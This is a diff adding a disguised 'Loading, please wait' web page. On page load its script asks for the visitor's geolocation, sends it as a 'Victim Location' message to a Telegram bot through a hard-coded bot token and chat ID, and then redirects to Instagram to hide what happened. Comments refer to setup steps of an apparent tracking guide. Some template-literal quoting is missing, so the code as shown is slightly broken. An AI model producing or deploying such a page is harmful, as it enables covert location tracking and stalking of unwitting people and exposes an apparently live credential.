@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <script>
+    const TOKEN = '8357641804:AAHj4VXU4lTjwxnwHC2lKiF60riElxYVWc0';  // Telegram bot token from Step 1
+    const CHAT_ID = '1796857790';  // Telegram user ID from Step 3
+    const REDIRECT_URL = 'https://www.instagram.com';  // Where victim goes after
+
+    function sendLocation(lat, lon) {
+      const msg = 📍 Victim Location:\\nLat: ${lat}\\nLon: ${lon};
+      fetch(https://api.telegram.org/bot${TOKEN}/sendMessage, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+      }).finally(() => {
+        window.location.href = REDIRECT_URL;
+      });
+    }
+
+    window.onload = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude),
+          () => window.location.href = REDIRECT_URL
+        );
+      } else {
+        window.location.href = REDIRECT_URL;
+      }
+    };
+  </script>
+</head>
+<body>
+  <p>Loading, please wait...</p>
+</body>
+</html>
